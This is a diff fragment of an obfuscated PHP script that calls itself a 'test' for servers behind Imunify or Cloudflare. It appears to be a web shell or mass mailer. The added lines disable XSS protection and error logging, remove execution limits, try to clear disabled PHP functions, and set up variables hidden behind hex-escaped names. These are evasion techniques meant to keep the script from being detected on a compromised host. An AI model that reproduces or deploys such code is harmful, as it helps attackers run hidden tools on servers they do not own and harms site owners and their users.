@@ -3,12 +3,25 @@
 /*
  * This file just for test for server who using imunify,cloudflare etc,
  *
- * (c) Telegram @ISC2k17 <rootcyberpunks@gmail.com>
+ * (c) Telegram ISC2k17 <rootcyberpunks@gmail.com>
  *
  * GOOD LUCK, HAVE FUN!
  */
 
 error_reporting(0);
+
+header("X-XSS-Protection: 0");
+ob_start();
+
+	@clearstatcache();
+	@mb_internal_encoding('UTF-8');
+	set_time_limit(0);
+	@ini_set('error_log',null);
+	@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+	@ini_set('display_errors', 0);
+	@ini_set('disable_functions', 0);
 ${"GLO\x42\x41L\x53"}["x\x6bv\x65q\x65\x6e\x73\x6f"]="\x6ci\x74\x65s\x70\x65\x65d";
 ${"\x47\x4c\x4fBA\x4c\x53"}["\x77\x64h\x76\x76\x78m\x74"]="t\x75\x6a\x75\x61\x6em\x61i\x6c";
 ${"\x47\x4c\x4fB\x41\x4c\x53"}["i\x61p\x6an\x63\x6el\x72\x64\x6d"]="p\x65\x73\x61n\x5f\x61l\x65rt";
